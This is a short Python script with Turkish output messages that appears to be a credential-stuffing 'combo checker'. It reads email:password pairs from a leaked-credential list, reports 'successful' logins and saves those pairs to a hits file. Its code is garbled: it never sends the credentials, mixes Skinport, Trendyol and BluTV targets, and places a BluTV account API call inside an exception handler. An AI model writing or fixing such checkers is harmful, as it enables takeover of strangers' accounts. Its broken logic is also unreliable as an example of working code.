import requests
combo_file = input(" ~ Combo : ")
with open(combo_file) as file, open("trendyol.txt", "a") as hit:
    for line in file:
        email, sifre = line.strip().split(":")
        try:
            if "success" in requests.get(f"https://skinport.com/tr/signin").text.lower():
                hit.write(f"{email}:{sifre}\n")
                print(f"Başarılı ✅: {email}:{sifre}")
            else:
                print(f"Başarısız❌: {email}:{sifre}")
        except requests.RequestException as e:
            print(f": {e}")

            api_url = "https://www.blutv.com/api/Hesabım"

            try:
                # API'ye GET isteği gönder
                response = requests.get(api_url)
                if response.status_code == 200:
                    account_data = response.json()
                    print("Üyelik Durumu:", account_data.get("membership_status"))
                    print("Hesap Bilgileri:", account_data)
                else:
                    print("API Hatası:", response.status_code, response.text)
            except requests.RequestException as e:
                print("Bağlantı hatası:", e)
